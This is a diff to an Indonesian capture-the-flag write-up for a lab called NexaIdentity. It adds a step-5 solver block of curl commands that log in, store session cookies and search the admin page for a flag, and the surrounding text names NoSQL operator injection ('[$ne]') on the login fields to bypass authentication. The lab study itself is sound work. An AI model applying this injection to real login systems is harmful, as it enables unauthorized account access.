@@ -2,6 +2,12 @@
 
 [← Overview](11-nexaidentity.md) · [Index](index.md)
 
+> **Langkah 5/9 — Eksploitasi / Solver.** Login normal sebagai employee:
+>
+> **Titik penting:** curl -sS -i -c admin.cookies \ · curl -sS -b admin.cookies "$BASE/dashboard" \| grep -o 'nav-user">[^<]*' · curl -sS -b admin.cookies "$BASE/admin" \| grep -i -A2 -B2 'NFX{'
+>
+> **Berikutnya:** [Script minimal](11-nexaidentity-06-script-minimal.md)
+
 ## 3.1 Strategi
 
 - Gunakan bracket notation `[$ne]` pada kedua field login.
